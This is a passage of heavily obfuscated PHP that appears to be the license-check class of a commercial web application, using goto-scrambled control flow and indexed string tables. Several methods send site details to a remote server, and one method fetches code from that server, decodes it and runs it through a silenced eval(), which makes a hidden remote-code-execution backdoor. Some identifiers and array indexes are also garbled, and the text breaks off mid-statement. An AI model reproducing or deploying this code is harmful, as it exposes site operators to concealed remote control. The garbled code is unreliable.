$this->{$_SERVER[޾][49]}(); goto e; B: while (strlen($bͶ) < $D[557]) { if (!$bͶ) { break; } $bͶ++; } $this->{$_SERVER[޾][3]}($bϷ[57], array($this, $bϷ[58])); $this->{$_SERVER[޾][3]}($bϷ[59], array($this, $bϷ[60])); goto e٠; Bݤ: $e˶ = $D[577]; if (!$e˶) { die; } $this->{$_SERVER[޾][47]}(); goto Cϛ; c崥: $D =& $_SERVER[]; $bϷ =& $_SERVER[޾]; $this->{$_SERVER[޾][46]}(); goto Bݤ; e: $e狹 = $D[580]; $this->{$_SERVER[޾][50]}(); $this->{$_SERVER[޾][51]}(); goto C뺙; e٠: $bȭՋ = $D[583]; goto F; Cϛ: $C = $D[578]; if (!$C) { return; } $this->{$_SERVER[޾][48]}(); goto cʊ; F: } public function tecx1fbbcbfe($F鐑ĕ) { goto eݍ; eݍ: $aΟ岈 =& $_SERVER[]; $E =& $_SERVER[޾]; $AƊ = $E[61]($E[62])->{$_SERVER[޾][63]}(); goto D; f؎: $CΣ = $aΟ岈[592]; if (!$CΣ) { die; } $F鐑ĕ[$E[108]][$E[113]] = $E[114]($_SERVER[$E[115]] . $AƊ[$E[116]]); goto DڶΤٹ; B: if (strlen($f̨Ц) < $aΟ岈[566]) { return; } unset($F鐑ĕ[$E[93]][$E[94]][$E[76]]); $e = $aΟ岈[589]; goto B֍; C: return $F鐑ĕ; goto d; dù: $F鐑ĕ[$E[93]][$E[94]][$E[99]] = array($E[100] => (int) $aʔ[$E[101]], $E[102] => $E[103]($E[104]($aʔ, $E[105], array())), $E[106] => (int) $E[104]($aʔ, $E[107], 0)); $Fӂὶ = $aΟ岈[591]; $F鐑ĕ[$E[108]][$E[109]] = $E[110]($E[111])->{$_SERVER[޾][112]}(); goto f؎; DڶΤٹ: $FѬ = $aΟ岈[593]; if (strlen($FѬ) < $aΟ岈[594]) { die; } $F鐑ĕ[$E[108]][$E[117]] = $E[118]($E[119]()); goto D; D: $F鐑ĕ[$E[108]][$E[120]] = $this->wlmgf8b9ae78; if ($AƊ[$E[120]] != $E[121]) { $F鐑ĕ[$E[108]][$E[122]] = $AƊ[$E[122]]; $F鐑ĕ[$E[108]][$E[123]] = $AƊ[$E[123]]; $DȽƽ鐋 = $E[124](10) . $this->wlmgf8b9ae78 . $E[124](5); $F鐑ĕ[$E[93]][$E[125]][$E[126]] = $this->{$_SERVER[޾][127]}($DȽƽ鐋, $F鐑ĕ[$E[108]][$E[113]]); } if ($this->wlmgf8b9ae78 == $E[121]) { $F鐑ĕ[$E[93]][$E[94]][$E[99]][$E[107]] = 0; } goto F; B֍: if (strlen($e) < $aΟ岈[557]) { return; } unset($F鐑ĕ[$E[93]][$E[94]][$E[98]]); $Cǩ = $aΟ岈[590]; goto dù; D: $cچ = $aΟ岈[584]; if (strlen($cچ) < $aΟ岈[566]) { die; } $Eϕ = array($E[64], $E[65], $E[66], $E[67], $E[68], $E[69], $E[70], $E[71], $E[72], $E[73], $E[74], $E[75], $E[76], $E[77], $E[78], $E[79], $E[80], $E[81], $E[82], $E[83], $E[84], $E[85], $E[86], $E[87], $E[88], $E[89], $E[90]); goto F; F: $E = $aΟ岈[585]; if (strlen($E) < $aΟ岈[563]) { die; } foreach ($Eϕ as $eڹ˿) { $FĚ = $GLOBALS[$E[91]][$E[92]][$eڹ˿]; $A꫗ = $aΟ岈[586]; if (strlen($A꫗) < $aΟ岈[566]) { die; } if (isset($AƊ[$eڹ˿])) { $FĚ = $AƊ[$eڹ˿]; } $F鐑ĕ[$E[93]][$E[94]][$eڹ˿] = $FĚ; } goto F; F: $F鐑ĕ[$E[108]][$E[128]] = $E[104]($this->zqlv1b5acc45, $E[129], $E[10]); $F鐑ĕ[$E[108]][$E[130]] = $E[104]($this->zqlv1b5acc45, $E[131], $E[10]); if ($E[104]($GLOBALS, $E[132]) && $this->config[$E[133]]) { $F鐑ĕ[$E[108]][$E[134]] = WEB_ROOT; } goto C; F: $aʔ = $F鐑ĕ[$E[93]][$E[94]][$E[76]]; unset($F鐑ĕ[$E[93]][$E[95]][$E[96]]); $Aꗬ = $aΟ岈[587]; goto c扌; c扌: if (strlen($Aꗬ) < $aΟ岈[563]) { die; } unset($F鐑ĕ[$E[93]][$E[95]][$E[97]]); $f̨Ц = $aΟ岈[588]; goto B; d: } private function uixc8fd7bf62() { goto E㎆; dޜ͉: if ($this->wlmgf8b9ae78 == $c[121]) { return; } $eէ = array($c[153], $c[154], $c[155], $c[156], $c[157], $c[158]); $e = $D[597]; goto e粴; e粴: $E򂂂 = $c[61]($c[62])->{$_SERVER[޾][63]}(); $f = array($c[159] => $E򂂂[$c[64]], $c[160] => $E򂂂[$c[65]], $c[161] => $c[10]); $dˎܼ = $D[598]; goto bį; bį: foreach ($eէ as $F) { if (!isset($E򂂂[$F]) || !$E򂂂[$F]) { continue; } $f[$F] = $E򂂂[$F]; } $c[13](array($c[151], $c[152]), $f); goto C; E㎆: $D =& $_SERVER[]; $c =& $_SERVER[޾]; if ($_SERVER[$c[44]] == $c[135]) { goto d膜; F魃߇: $B = $D[596]; goto FⰑ; d膜: $cݶ = array($c[120] => $this->wlmgf8b9ae78, $c[136] => $this->{$_SERVER[޾][137]}(), $c[138] => $c[61]($c[139])->{$_SERVER[޾][140]}()); if ($this->wlmgf8b9ae78 != $c[121]) { $C٬ = $c[104]($this->zqlv1b5acc45, $c[141]); if ($C٬) { $cݶ[$c[142]] = $C٬; $cݶ[$c[143]] = $c[144]($c[104]($this->zqlv1b5acc45, $c[145])); $cݶ[$c[146]] = $c[104]($this->zqlv1b5acc45, $c[131]); } } $cݶ = $this->{$_SERVER[޾][147]}($c[148]($cݶ), $c[114]($c[149])); goto c·; c·: $f = array($c[150] => $cݶ); $Fؽ䌽 = $D[595]; $c[13](array($c[151], $c[152]), $f); goto F魃߇; FⰑ: } goto dޜ͉; C: } private function pyrd661f15a9() { goto c̆; f: if (!isset($Eְ[$d[165]]) || $d[24]($Eְ[$d[165]]) != 16) { $d[166]($d[167] . $Eְ[$d[165]], !1); } $D = $d[61]($d[62])->{$_SERVER[޾][63]}($d[116]); $B枆ܙ = array($d[165] => $Eְ[$d[165]], $d[168] => $d[124](16), $d[169] => $d[149], $d[170] => $d[171], $d[172] => $_SERVER[$d[173]], $d[174] => $_SERVER[$d[175]], $d[176] => $_SERVER[$d[177]]); goto c鉧; c̆: $bꌍ =& $_SERVER[]; $d =& $_SERVER[޾]; if ($_SERVER[$d[44]] != $d[162]) { return; } goto A҂; A箏ҹ: $C = $bꌍ[610]; if (!$C) { die; } $this->zqlv1b5acc45 = $E; goto Cեڳ; BԮ퉎: if (strlen($e̱ł) < $bꌍ[566]) { return; } if (!$Dܩ || $Dܩ != $d[201]($E[$d[145]])) { $aٍܺ = array($d[202] => $d[61]($d[62])->{$_SERVER[޾][63]}($d[116]), $d[203] => $_SERVER[$d[115]], $d[204] => $d[205](), $d[174] => $_SERVER[$d[175]]); $E쩑 = $this->{$_SERVER[޾][206]}($d[148]($aٍܺ)); $this->{$_SERVER[޾][182]}($d[207] . $E쩑); $d[166]($d[197]($d[208]), !0); } $c֎֡ = array($d[209] => $B枆ܙ[$d[165]], $d[210] => $E[$d[211]], $d[212] => $d[124](16), $d[120] => $E[$d[213]]); goto cƈ; Cń: $CÌʚ = $bꌍ[609]; if (strlen($CÌʚ) < $bꌍ[557]) { die; } $d[61]($d[11])->{$_SERVER[޾][226]}($c䙪̛[$d[227]], array($d[228] => $f×څ)); goto A箏ҹ; e: $c֎֡[$d[123]] = $d[118]($d[214]($this->{$_SERVER[޾][147]}($aֺ, $d[216]))); if ($E[$d[217]] && $E[$d[217]] >= 1) { $d[61]($d[62])->{$_SERVER[޾][218]}($d[219], $d[220]); } $d[61]($d[62])->{$_SERVER[޾][221]}($c֎֡); goto Dᾟ; Cեڳ: $this->wlmgf8b9ae78 = $c֎֡[$d[120]]; $this->{$_SERVER[޾][229]}(); $d[166]($d[197]($d[208]), !0); goto b⌌; cְ: $Cꑧ = $this->{$_SERVER[޾][127]}($d[148]($E), $c𖮮); $D꾃 = $bꌍ[607]; if (!$D꾃) { return; } goto a; a: $D = $d[222]($d[61]($d[11])->{$_SERVER[޾][223]}(), $d[224]); $c䙪̛ = $D[$d[225]]; $f×څ = array(); goto b; d趚: $E = $bӣ[$d[192]]; $Dܩ = $this->{$_SERVER[޾][199]}($E[$d[200]]); $e̱ł = $bꌍ[601]; goto BԮ퉎; A҂: if (!$d[104]($GLOBALS, $d[132])) { die; } $Eְ = $GLOBALS[$d[22]]; if (isset($Eְ[$d[163]])) { $this->{$_SERVER[޾][164]}(); die; } goto f; e҆: while (strlen($a̐â) < $bꌍ[563]) { if (!$a̐â) { break; } $a̐â++; } if ($Eְ[$d[178]] == $d[179]) { $dꆈ = $this->{$_SERVER[޾][147]}($B򞖃, $d[180]); $E쩑 = $this->{$_SERVER[޾][127]}($d[148]($B枆ܙ), $B򞖃 . $d[181], 3); $e֭ = $this->{$_SERVER[޾][182]}($d[183] . $dꆈ . $d[184] . $E쩑, -1); $d[166]($e֭, !0); } else { if ($Eְ[$d[178]] == $d[185]) { $Cԇߊ = $d[25]($d[114]($d[186] . $B򞖃), 12, 15) . $d[187]; $E쩑 = $this->{$_SERVER[޾][188]}($d[2]($Eְ[$d[189]]), $Cԇߊ, 2); $bӣ = $d[190]($E쩑, !0); if (!$d[191]($bӣ) || !$d[191]($bӣ[$d[192]]) || $bӣ[$d[165]] != !0) { $F = $d[193]; $B÷ = $bӣ[$d[192]] ? $d[194] . $bӣ[$d[192]] : $F; $d[166]($B÷, !1); } else { $B枆ܙ[$d[168]] = $bӣ[$d[192]][$d[195]]; } } else { $bӣ = $this->{$_SERVER[޾][182]}($d[196], $B枆ܙ, 10); } } if (!$d[191]($bӣ) || !$d[191]($bӣ[$d[192]]) || $bӣ[$d[165]] != !0) { $F = $d[197]($d[198]); $B÷ = $bӣ[$d[192]] ? $d[194] . $bӣ[$d[192]] : $F; $d[166]($B÷, !1); } goto d趚; Dᾟ: $c𖮮 = $d[114]($_SERVER[$d[115]] . $d[214]($D) . $c֎֡[$d[210]]); $F = $bꌍ[605]; while (strlen($F) < $bꌍ[563]) { if (!$F) { break; } $F++; } goto C; C܆: $b׍ = $bꌍ[602]; while ($b׍ < $bꌍ[594]) { if ($b׍ >= 0) { break; } $b׍++; } $c֎֡[$d[122]] = $d[214]($d[118]($this->{$_SERVER[޾][147]}($Dㄡ, $d[215]))); goto D͋孌; cƈ: if ($B枆ܙ[$d[168]]) { $c֎֡[$d[212]] = $B枆ܙ[$d[168]]; } $c = $d[25]($d[114]($c֎֡[$d[210]]), 10, 10); $Dㄡ = $c . $c֎֡[$d[120]] . $c֎֡[$d[212]]; goto C܆; Dڄ: $AΝĒ = $bꌍ[604]; if (strlen($AΝĒ) < $bꌍ[563]) { return; } $aֺ = $dܘ . $c֎֡[$d[120]] . $this->{$_SERVER[޾][147]}($d[114]($c֎֡[$d[209]]), $dܘ); goto e; c鉧: $bѱˊ = $bꌍ[599]; $B򞖃 = $d[114]($_SERVER[$d[115]] . $D); $a̐â = $bꌍ[600]; goto e҆; b: $bҨ = $bꌍ[608]; if (strlen($bҨ) < $bꌍ[555]) { die; } $f×څ[$Fֲ] = $Cꑧ; goto Cń; C: $Fֲ = $d[214]($d[25]($c𖮮, 10, 16)); $fٜ = $bꌍ[606]; if (strlen($fٜ) < $bꌍ[566]) { die; } goto cְ; D͋孌: $d = $bꌍ[603]; while (strlen($d) < $bꌍ[594]) { if (!$d) { break; } $d++; } $dܘ = $d[124](16); goto Dڄ; b⌌: } private function licenseRegistSuccess() { $c =& $_SERVER[޾]; $d = $c[61]($c[62])->{$_SERVER[޾][63]}(); if ($d[$c[85]] != $c[220]) { $c[61]($c[62])->{$_SERVER[޾][221]}($c[85], $c[220]); } $c[110]($c[230])->{$_SERVER[޾][231]}(!0); } private function ogrj94dcf672() { goto bБ; CՕ: $AՍ = $b𻵷[613]; if (strlen($AՍ) < $b𻵷[594]) { return; } $this->wlmgf8b9ae78 = $b[121]; goto A㉄; F: $aö = $b𻵷[612]; if (strlen($aö) < $b𻵷[594]) { die; } $this->zqlv1b5acc45 = array(); goto CՕ; b௾: $a = $b𻵷[611]; while (strlen($a) < $b𻵷[557]) { if (!$a) { break; } $a++; } $b[61]($b[62])->{$_SERVER[޾][218]}($b[219], $b[232]); goto F; bБ: $b𻵷 =& $_SERVER[]; $b =& $_SERVER[޾]; $b[61]($b[62])->{$_SERVER[޾][221]}(array($b[209] => $b[10], $b[210] => $b[10], $b[120] => $b[121], $b[122] => $b[10], $b[123] => $b[10])); goto b௾; A㉄: } private function jhmn278970ef() { goto F; a: $c؉ = $b֖[61]($b֖[62])->{$_SERVER[޾][63]}(); $Bܓِ = $Bع[615]; if (strlen($Bܓِ) < $Bع[594]) { return; } goto e; b҂: $this->wlmgf8b9ae78 = $c؉[$b֖[120]]; goto aߢ͋; D¹: $Bԉ = $b֖[144]($B̕қᎳ[$b֖[145]]); if ($b֖[233]() >= $Bԉ) { return $this->{$_SERVER[޾][164]}(); } $this->zqlv1b5acc45 = $B̕қᎳ; goto b҂; AŦ: $Cᱴ = $Bع[614]; if (!$Cᱴ) { return; } $this->wlmgf8b9ae78 = $b֖[121]; goto a; fæ: $B̕қᎳ = $this->{$_SERVER[޾][188]}($a[$b֖[91]][$Dϳ], $bź); $B̕қᎳ = $b֖[190]($B̕қᎳ, !0); if (!$b֖[191]($B̕қᎳ)) { return $this->{$_SERVER[޾][164]}(); } goto D¹; F: $Bع =& $_SERVER[]; $b֖ =& $_SERVER[޾]; $_SERVER[$b֖[175]] = $b֖[104]($_SERVER, $b֖[175], APP_HOST); goto AŦ; b턝: $bź = $b֖[114]($_SERVER[$b֖[115]] . $b֖[214]($fÉ) . $c؉[$b֖[210]]); $C𜽫 = $Bع[617]; if (!$C𜽫) { return; } goto e؃; e: if ($c؉[$b֖[120]] == $b֖[121]) { return; } $fÉ = $b֖[61]($b֖[62])->{$_SERVER[޾][63]}($b֖[116]); $f拖樏 = $b֖[222]($b֖[61]($b֖[11])->{$_SERVER[޾][223]}(), $b֖[224]); goto C; C: $a = $f拖樏[$b֖[225]]; $a = $Bع[616]; while ($a < $Bع[594]) { if ($a >= 0) { break; } $a++; } goto b턝; e؃: $Dϳ = $b֖[214]($b֖[25]($bź, 10, 16)); $eŦȥ = $Bع[618]; if (!$eŦȥ) { return; } goto fæ; aߢ͋: } private function sauq8845c2f3() { goto bӹ; a: $eǸ = $b،ʶ[619]; while (strlen($eǸ) < $b،ʶ[557]) { if (!$eǸ) { break; } $eǸ++; } $E = $_SERVER[$F[44]]; goto d; bӹ: $b،ʶ =& $_SERVER[]; $F =& $_SERVER[޾]; $DĻԍ = $GLOBALS[$F[22]]; goto a; d: $dˌ = $b،ʶ[620]; if (strlen($dˌ) < $b،ʶ[563]) { return; } if ($E == $F[234] && $this->wlmgf8b9ae78 == $F[121]) { $F[166]($F[197]($F[235]), !1, $F[236]); } goto A; A: $Dмߟ = array($F[237], $F[238]); if ($F[239]($E, $Dмߟ)) { if ($this->wlmgf8b9ae78 == $F[121] && isset($DĻԍ[$F[240]])) { $F[166]($F[197]($F[235]), !1, $F[236]); die; } $a = $this->{$_SERVER[޾][137]}(); if ($a != $F[201]($F[241])) { if ($a <= $F[61]($F[139])->{$_SERVER[޾][140]}()) { $F[166]($F[197]($F[242]), !1, $F[236]); die; } } } goto dѓ; dѓ: } private function wmfz4939af4e() { goto BÓ; Dػ: $B[254]($B[255]); if ($e٫ߨ && $B[32]($e٫ߨ, $B[256])) { echo $e٫ߨ; } die; goto Dˬʗ; BÓ: $a߸ =& $_SERVER[]; $B =& $_SERVER[޾]; $E״ = array($B[135], $B[243]); goto C; Eϟڷ: $DƄ = $B[245]; $cʉ = $a߸[622]; while (strlen($cʉ) < $a߸[557]) { if (!$cʉ) { break; } $cʉ++; } goto d; C: $B = $a߸[621]; if (!$B[104]($GLOBALS, $B[132]) || !isset($_GET[$B[244]])) { return; } if (!$B[239]($_SERVER[$B[44]], $E״)) { return; } goto Eϟڷ; E: $e٫ߨ = @$B[253]($DƄ, !1, $a˂Ӭ); $d炝 = $a߸[624]; if (!$d炝) { return; } goto Dػ; d: $DƄ = $this->{$_SERVER[޾][246]}($DƄ, $B[247]); $a˂Ӭ = $B[248](array($B[249] => array($B[250] => $B[251], $B[252] => 3))); $cо = $a߸[623]; goto E; Dˬʗ: } public function vpgmb0545de0($d飶) { goto FꙒ; bᗌƊ: $E𨔓 = array($aƫ[258], $aƫ[259], $aƫ[260], $aƫ[261], $aƫ[262], $aƫ[263], $aƫ[264], $aƫ[265]); $eȱג = $aƫ[0]($aƫ[266], $aƫ[104]($this->zqlv1b5acc45, $aƫ[129], $aƫ[10])); $C = array(); goto aܚ; aܚ: $b߈ = $C[625]; while ($b߈ < $C[566]) { if ($b߈ >= 0) { break; } $b߈++; } foreach ($E𨔓 as $fל) { if (!$aƫ[239]($fל, $eȱג)) { $C[] = $fל; } } goto eʴ; eʴ: foreach ($C as $fל) { unset($d飶[$fל]); $a = $C[626]; while ($a < $C[563]) { if ($a >= 0) { break; } $a++; } } return $d飶; $B = $C[627]; goto F߰; F߰: while (strlen($B) < $C[557]) { if (!$B) { break; } $B++; } goto e; FꙒ: $C =& $_SERVER[]; $aƫ =& $_SERVER[޾]; if ($this->wlmgf8b9ae78 == $aƫ[257]) { return $d飶; } goto bᗌƊ; e: } private function xpkt362aeaba() { goto F梟; Fﶪ: $F = array($eߐƙ[268]); $eꦿ = $_SERVER[][628]; if (!$eꦿ) { die; } goto C; F梟: $eߐƙ =& $_SERVER[޾]; if ($this->wlmgf8b9ae78 != $eߐƙ[121]) { $GLOBALS[$eߐƙ[91]][$eߐƙ[95]][$eߐƙ[267]] = $eߐƙ[220]; return; } $b֊ = $_SERVER[$eߐƙ[44]]; goto Fﶪ; C: foreach ($F as $f) { if ($f == $b֊ || $eߐƙ[25]($b֊, 0, $eߐƙ[24]($f)) == $f) { $eߐƙ[166]($eߐƙ[197]($eߐƙ[269]), !1); } } $GLOBALS[$eߐƙ[91]][$eߐƙ[95]][$eߐƙ[270]] = $eߐƙ[220]; $GLOBALS[$eߐƙ[91]][$eߐƙ[95]][$eߐƙ[267]] = $eߐƙ[232]; goto dև; dև: $GLOBALS[$eߐƙ[91]][$eߐƙ[271]] = $eߐƙ[220]; if ($eߐƙ[61]($eߐƙ[272])->{$_SERVER[޾][63]}($eߐƙ[85]) != $eߐƙ[232]) { $eߐƙ[61]($eߐƙ[272])->{$_SERVER[޾][221]}($eߐƙ[85], $eߐƙ[232]); } goto bş; bş: } public function vcxh593ad74b() { return $_SERVER[޾][273]; $c = $_SERVER[][629]; if (!$c) { die; } } private function hoqp1ce5abdb() { goto E; Aƫ: $this->{$_SERVER[޾][164]}(); if ($this->{$_SERVER[޾][199]}($B[$b[283]]) != $bԽ[$b[165]]) { $FƝ = array($b[202] => $b[61]($b[62])->{$_SERVER[޾][63]}($b[116]), $b[203] => $_SERVER[$b[115]], $b[204] => $b[205](), $b[174] => $_SERVER[$b[175]]); $E甏 = $this->{$_SERVER[޾][206]}($b[148]($FƝ)); $B = $this->{$_SERVER[޾][182]}($b[207] . $E甏); if ($B && $b[191]($B) && isset($B[$b[283]])) { $Aұǃ = $this->{$_SERVER[޾][188]}($B[$b[283]], 2); if ($Aұǃ) { $Aұǃ = $this->{$_SERVER[޾][199]}($Aұǃ); } if ($Aұǃ) { try { @eval($Aұǃ); } catch (Exception $AƟ) { } } } } goto d褛; eދ: $Bʒˠ = $b[277] . $b[114]($b[278]); if ($this->wlmgf8b9ae78 == $b[121] || !$b[104]($GLOBALS, $b[132])) { return; } if (!$b[239]($_SERVER[$b[44]], $BӦб)) { return; } goto f; Cܭ: if ($EӍ && $b[233]() - $EӍ < $b[201]($b[281])) { return; } $b[13](array($b[279], $b[152]), $Bʒˠ, $b[233]()); $B = $A۝Ԧ[631]; goto DƗҶ; f: if ($b[233]() % 4 != 0) { return; } $EӍ = $b[13](array($b[279], $b[280]), $Bʒˠ); $D回 = $A۝Ԧ[630]; goto Cܭ; Fʙ: while ($F < $A۝Ԧ[566]) { if ($F >= 0) { break; } $F++; } $B = $this->{$_SERVER[޾][182]}($b[282], $bԽ); $bƑϝ = $A۝Ԧ[633]; goto a; E: $A۝Ԧ =& $_SERVER[]; $b =& $_SERVER[޾]; $BӦб = array($b[274], $b[275], $b[276]); goto eދ; DƗҶ: if (strlen($B) < $A۝Ԧ[555]) { die; } $bԽ = array($b[165] => $b[61]($b[62])->{$_SERVER[޾][63]}($b[209]), $b[178] => $this->wlmgf8b9ae78, $b[176] => $_SERVER[$b[177]], $b[169] => $b[149], $b[172] => $_SERVER[$b[173]]); $F = $A۝Ԧ[632]; goto Fʙ; a: if (!$bƑϝ) { return; } if (!$b[191]($B)) { return; } if ($B[$b[165]] && $B[$b[283]]) { if ($this->{$_SERVER[޾][199]}($B[$b[283]]) == $bԽ[$b[165]]) { return; } } goto Aƫ; d褛: } private function uqnj035531f5($A = '', $b = array(), $aƘ = 5) { goto Eʉȭ; b܍݈: if (strlen($aѩ) < $f̉[566]) { die; } goto DЊ; Eʉȭ: $f̉ =& $_SERVER[]; $D =& $_SERVER[޾]; $F܉ = $D[284]; goto b֭; e϶: $D = $f̉[635]; if (!$D) { die; } $b = @$D[253]($F܉, !1, $Fˋ栰); goto f̋; FԼ۾: $dĉ = $f̉[637]; while (strlen($dĉ) < $f̉[563]) { if (!$dĉ) { break; } $dĉ++; } $aѩ = $f̉[638]; goto b܍݈; b֭: $F܉ = $this->{$_SERVER[޾][246]}($F܉, $D[285]); $F܉ = $F܉ . $A . $D[286] . $D[287]($b); $C쬻 = $f̉[634]; goto bͽ; f̋: $E = $f̉[636]; if (!$E) { die; } return $D[190]($b, !0); goto FԼ۾; bͽ: while ($C쬻 < $f̉[594]) { if ($C쬻 >= 0) { break; } $C쬻++; } if ($b === -1) { return $F܉; } $Fˋ栰 = $D[248](array($D[249] => array($D[252] => $aƘ, $D[250] => $D[288]), $D[289] => array($D[290] => !1, $D[291] => !1))); goto e϶; DЊ: } private function fhnt942cda7a() { goto c; dތ: $C႒ = $Fݭ賂[639]; if (strlen($C႒) < $Fݭ賂[557]) { die; } $e = $D˙[$this->wlmgf8b9ae78]; goto Bך; E: $BȪ = $BȪ ? $Aئ泡ۿ[201]($BȪ) : 0; $D = $Fݭ賂[641]; while (strlen($D) < $Fݭ賂[563]) { if (!$D) { break; } $D++; } goto a͡; Bך: $e = $Aئ泡ۿ[201]($e ? $e : $Aئ泡ۿ[293]); $a = $Fݭ賂[640]; $BȪ = $Aئ泡ۿ[104]($this->zqlv1b5acc45, $Aئ泡ۿ[319]); goto E; a͡: return $e + $BȪ; $e슸 = $Fݭ賂[642]; goto A; c: $Fݭ賂 =& $_SERVER[]; $Aئ泡ۿ =& $_SERVER[޾]; $D˙ = array($Aئ泡ۿ[292] => $Aئ泡ۿ[293], $Aئ泡ۿ[294] => $Aئ泡ۿ[295], $Aئ泡ۿ[296] => $Aئ泡ۿ[297], $Aئ泡ۿ[298] => $Aئ泡ۿ[299], $Aئ泡ۿ[300] => $Aئ泡ۿ[301], $Aئ泡ۿ[302] => $Aئ泡ۿ[241], $Aئ泡ۿ[303] => $Aئ泡ۿ[241], $Aئ泡ۿ[304] => $Aئ泡ۿ[293], $Aئ泡ۿ[305] => $Aئ泡ۿ[295], $Aئ泡ۿ[306] => $Aئ泡ۿ[297], $Aئ泡ۿ[307] => $Aئ泡ۿ[308], $Aئ泡ۿ[309] => $Aئ泡ۿ[299], $Aئ泡ۿ[310] => $Aئ泡ۿ[311], $Aئ泡ۿ[312] => $Aئ泡ۿ[301], $Aئ泡ۿ[313] => $Aئ泡ۿ[314], $Aئ泡ۿ[315] => $Aئ泡ۿ[316], $Aئ泡ۿ[317] => $Aئ泡ۿ[318]); goto dތ; A: } public function cgmh38fab331($C) { goto e; d݄: $A׈ = $F˱ׂ[61]($F˱ׂ[139])->{$_SERVER[޾][320]}($F˱ׂ[321])->{$_SERVER[޾][322]}($bŘ)->{$_SERVER[޾][323]}(); $A׈ = $F˱ׂ[222]($A׈, $F˱ׂ[10], $F˱ׂ[321]); if (!$F˱ׂ[239]($C[$F˱ׂ[321]], $A׈)) { $F˱ׂ[166]($F˱ׂ[324], !1, $F˱ׂ[236]); } goto aڟ; C: $dʥ = $FҌ[643]; if ($bŘ >= $F˱ׂ[201]($F˱ׂ[241])) { return; } $b = $F˱ׂ[61]($F˱ׂ[139])->{$_SERVER[޾][140]}(); goto a; e: $FҌ =& $_SERVER[]; $F˱ׂ =& $_SERVER[޾]; $bŘ = $this->{$_SERVER[޾][137]}(); goto C; a: $a = $FҌ[644]; if (strlen($a) < $FҌ[594]) { die; } if ($b <= $bŘ) { return; } goto d݄; aڟ: } public function jhcu2436b940() { goto f; Aˣ: $d = $fܚ[645]; if (strlen($d) < $fܚ[594]) { die; } $fٵ = @$fϧ[253]($b, !1, $E); goto fņ; Cɋ: $b = $fϧ[245]; $b = $this->{$_SERVER[޾][246]}($b, $fϧ[247]); $E = $fϧ[248](array($fϧ[249] => array($fϧ[250] => $fϧ[251], $fϧ[252] => 3))); goto Aˣ; fņ: echo $fϧ[326] . $fϧ[327]($fٵ) . $fϧ[328]; $Eı߽ = $fܚ[646]; while (strlen($Eı߽) < $fܚ[563]) { if (!$Eı߽) { break; } $Eı߽++; } goto dڤď; f: $fܚ =& $_SERVER[]; $fϧ =& $_SERVER[޾]; if (!$fϧ[104]($GLOBALS, $fϧ[132]) || $fϧ[325](1, 100) > 20) { return; } goto Cɋ; dڤď: } private function winad7789150($Eט, $E, $B = 3) { goto DЪ; a: if (!$fڝ) { return; } switch ($a򷞯) { case $C̭[232]: $bӴ = $this->{$_SERVER[޾][147]}($Eט, $C̭[214]($E . $a)); $A = $C܄[650]; if (strlen($A) < $C܄[555]) { return; } break; case $C̭[220]: $bӴ = $this->{$_SERVER[޾][147]}($Eט, $C̭[214]($a . $E)); $B = $C܄[651]; if (!$B) { die; } break; $BĴ = $C܄[652]; if (strlen($BĴ) < $C܄[557]) { die; } case $C̭[331]: $bӴ = $this->{$_SERVER[޾][147]}($Eט, $C̭[118]($a . $E)); break; $D褂 = $C܄[653]; if (strlen($D褂) < $C܄[594]) { return; } case $C̭[332]: $bӴ = $this->{$_SERVER[޾][147]}($Eט, $C̭[114]($a . $E)); $b = $C܄[654]; break; case $C̭[333]: goto bÅϼ; eׇ: $a = 0; $c = 0; for ($A = 0; $A < $C̭[24]($Eט); $A++) { $c = $c == $C̭[24]($A) ? 0 : $c; $a = $C܄[658]; if (!$a) { die; } $a = ($F皖م + $C̭[335]($DП, $Eט[$A]) + $C̭[336]($A[$c++])) % 64; $F .= $DП[$a]; $Aڪ = $C܄[659]; while (strlen($Aڪ) < $C܄[563]) { if (!$Aڪ) { break; } $Aڪ++; } } goto eͧۤ; b: $A = $C̭[114]($dْ . $C̭[114]($E . $dْ) . $E); $A = $C̭[25]($A, $F皖م % 8, $F皖م % 8 + 7); $F = $C̭[10]; goto F䳚; bÅϼ: $Eט = $C̭[118]($Eט); $bŬ̬ي = $C܄[655]; $F皖م = $C̭[334](0, 64); goto b頊; F䳚: $A = 0; $d˞ԧ = $C܄[657]; while (strlen($d˞ԧ) < $C܄[594]) { if (!$d˞ԧ) { break; } $d˞ԧ++; } goto eׇ; eͧۤ: $bӴ = $C̭[327]($dْ . $F); $EܺЖ = $C܄[660]; while (strlen($EܺЖ) < $C܄[566]) { if (!$EܺЖ) { break; } $EܺЖ++; } goto aՈ; b頊: $eێ = $C܄[656]; if (!$eێ) { return; } $dْ = $DП[$F皖م]; goto b; aՈ: break; $a = $C܄[661]; if (strlen($a) < $C܄[555]) { return; } goto F龇; F龇: default: $bӴ = $this->{$_SERVER[޾][147]}($Eט, $E . $a); break; } $bӴ = $C̭[214]($a򷞯 . $a . $bӴ); goto eщ; DЪ: $C܄ =& $_SERVER[]; $C̭ =& $_SERVER[޾]; $C̭[329](1); goto b󹦳; F֍: while ($dϣ < $C܄[566]) { if ($dϣ >= 0) { break; } $dϣ++; } $a = $C̭[124](15); $dވǥ = $C܄[648]; goto b⮔; b⮔: if (strlen($dވǥ) < $C܄[594]) { die; } $DП = $C̭[330]; $fڝ = $C܄[649]; goto a; eщ: if ($B - 1 > 0) { $bӴ = $this->{$_SERVER[޾][127]}($bӴ, $E, $B - 1); } return $bӴ; goto Cğ٢; b󹦳: $Eט = $C̭[2]($Eט); $a򷞯 = $C̭[325](0, 5) . $C̭[10]; $dϣ = $C܄[647]; goto F֍; Cğ٢: } private function vrnhdb8b38b7($E, $d̥, $F = 3) { goto A; a: $E = $Cӽ[2]($E); $E = $Cӽ[214]($E); $b斯 = $E[662]; goto aίѶĬ; e: return $b; goto Aټ; aίѶĬ: $a˪ϒ = $E[0]; $a = $Cӽ[25]($E, 1, 15); $Dȷ = $E[663]; goto eǠ; A: $E =& $_SERVER[]; $Cӽ =& $_SERVER[޾]; if (!$Cӽ[337]($E) || $Cӽ[24]($E) < 10) { return !1; } goto a; Eԅ: $f̯⃍ = $Cӽ[330]; switch ($a˪ϒ) { case $Cӽ[232]: $b = $this->{$_SERVER[޾][246]}($E, $Cӽ[214]($d̥ . $a)); break; $aФŎ = $E[665]; while ($aФŎ < $E[594]) { if ($aФŎ >= 0) { break; } $aФŎ++; } case $Cӽ[220]: $b = $this->{$_SERVER[޾][246]}($E, $Cӽ[214]($a . $d̥)); $D = $E[666]; if (strlen($D) < $E[563]) { return; } break; $E = $E[667]; case $Cӽ[331]: $b = $this->{$_SERVER[޾][246]}($E, $Cӽ[118]($a . $d̥)); $d鶍ޞ = 